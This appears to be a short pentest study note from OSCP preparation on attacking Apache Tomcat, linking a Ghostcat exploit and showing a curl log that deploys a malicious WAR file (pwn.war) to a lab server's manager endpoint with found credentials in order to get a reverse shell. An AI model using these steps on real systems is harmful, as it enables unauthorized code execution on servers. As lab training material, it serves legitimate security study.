

- Check for ghostcat vulnerability if port 8009 is opened

https://github.com/00theway/Ghostcat-CNVD-2020-10487.git

---
### Authenticated

- if able to find creds to login, try to exploit via UI by uploading a war file and executing it
  follow this article: https://www.hackingarticles.in/tomcat-penetration-testing/


- if the manager app only accessible from localhost error comes try to upload war file via curl directly to get a rev shell
  
```bash
┌──(thomasthecat㉿thomasthecat)-[~/Documents/OSCP_PREP/thm/dotjar]
└─$ curl -v -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file pwn.war 'http://10.10.98.110:8080/manager/text/deploy?path=/test'
*   Trying 10.10.98.110:8080...
* Connected to 10.10.98.110 (10.10.98.110) port 8080
* Server auth using Basic with user 'webdev'
> PUT /manager/text/deploy?path=/test HTTP/1.1
> Host: 10.10.98.110:8080
> Authorization: Basic d2ViZGV2OkhnajNMQSQwMkQkRmFAMjE=
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 13031
> 
* upload completely sent off: 13031 bytes
< HTTP/1.1 200 
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Wed, 25 Sep 2024 15:14:52 GMT
< 
OK - Deployed application at context path [/test]
* Connection #0 to host 10.10.98.110 left intact
                                                                                                                                                 
┌──(thomasthecat㉿thomasthecat)-[~/Documents/OSCP_PREP/thm/dotjar]
└─$ curl 'http://10.10.98.110:8080/test' 
```